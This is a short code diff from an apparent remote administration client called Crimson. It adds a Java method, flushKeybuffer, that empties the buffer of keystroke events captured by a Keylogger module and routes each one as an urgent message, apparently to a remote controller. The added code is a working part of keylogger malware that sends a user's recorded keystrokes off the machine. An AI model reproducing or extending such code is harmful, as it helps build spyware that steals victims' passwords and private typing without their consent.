@@ -17,11 +17,26 @@
  *****************************************************************************/
 package com.subterranean_security.crimson.client.net;
 
+import java.util.ArrayList;
+
+import com.subterranean_security.crimson.client.modules.Keylogger;
+import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
+import com.subterranean_security.crimson.core.proto.MSG.Message;
+
 public enum ClientCommands {
 	;
 
 	public static void downloadLibs() {
 
+	}
+
+	public static void flushKeybuffer() {
+		ArrayList<EV_KEvent> buffer = Keylogger.buffer;
+		Keylogger.buffer = new ArrayList<EV_KEvent>();
+
+		for (EV_KEvent k : buffer) {
+			ClientRouter.route(Message.newBuilder().setUrgent(true).setEvKevent(k));
+		}
 	}
 
 }
